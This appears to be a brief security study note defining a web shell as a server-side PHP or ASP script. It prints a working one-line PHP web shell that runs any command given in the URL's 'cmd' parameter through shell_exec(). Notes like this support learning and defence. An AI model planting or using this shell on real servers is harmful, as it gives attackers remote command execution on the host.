...
Script that runs inside of a webserver
- Usually PHP or ASP

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

- will take a GET parameter in the URL and execute it on the system w/ `shell_exec()`
-  any commands entered into URL after `?cmd=` will be executed on the system
